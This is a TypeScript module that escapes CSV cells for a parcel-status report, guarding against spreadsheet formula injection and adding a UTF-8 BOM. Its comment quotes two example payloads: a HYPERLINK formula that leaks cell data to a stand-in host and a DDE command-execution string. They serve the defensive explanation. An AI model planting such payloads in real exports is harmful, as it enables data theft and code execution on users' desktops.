/**
 * CSV serialisation for the état colis report.
 *
 * Pure, and separate from the query because the escaping below is the part that
 * has to be right and the part worth unit-testing on its own.
 */

/**
 * ⚠️ CSV FORMULA INJECTION. A cell beginning `=`, `+`, `-`, `@`, a tab or a
 * carriage return is executed as a FORMULA by Excel, LibreOffice and Google
 * Sheets when the file is opened.
 *
 * The merchant name in this report is attacker-controlled: anyone who can sign
 * up as a merchant chooses it. A name of
 *
 *     =HYPERLINK("https://evil.tn?d="&A1,"Click")
 *
 * becomes a live link in the courier's own spreadsheet, and
 * `=cmd|'/c calc'!A1` is the DDE variant that has led to remote code execution
 * in the wild. The export is opened by a finance clerk on a Windows desktop,
 * which is exactly the target.
 *
 * The defence is a leading apostrophe, which every major spreadsheet treats as
 * "the rest is text". Quoting alone does NOT help: Excel strips the quotes and
 * then evaluates what is inside.
 */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/** One cell, escaped for both CSV syntax and spreadsheet formula evaluation. */
export function csvCell(value: string | number | null): string {
  if (value === null) {
    return "";
  }
  const raw = String(value);
  const neutralised = FORMULA_PREFIXES.some((prefix) => raw.startsWith(prefix))
    ? `'${raw}`
    : raw;

  // RFC 4180: a field containing a quote, a comma or a newline is quoted, and
  // inner quotes are doubled.
  return /[",\n\r]/u.test(neutralised) ? `"${neutralised.replaceAll('"', '""')}"` : neutralised;
}

/**
 * A UTF-8 byte-order mark.
 *
 * ⚠️ Excel on Windows reads a BOM-less UTF-8 file as the system codepage, which
 * turns every Arabic merchant name and every accented French one into mojibake —
 * the single most common complaint about exported reports in this market.
 *
 * Written as an ESCAPE, not pasted: the literal character trips
 * `no-irregular-whitespace`, and an invisible byte is exactly the kind of thing
 * nobody should be editing by eye.
 */
const BOM = "\uFEFF";

/**
 * Rows → a CSV document.
 *
 * CRLF line endings because RFC 4180 specifies them and older Excel builds treat
 * a lone LF as part of the field.
 */
export function toCsv(
  headers: readonly string[],
  rows: readonly (readonly (string | number | null)[])[],
): string {
  const lines = [headers.map(csvCell).join(","), ...rows.map((row) => row.map(csvCell).join(","))];
  return `${BOM}${lines.join("\r\n")}\r\n`;
}
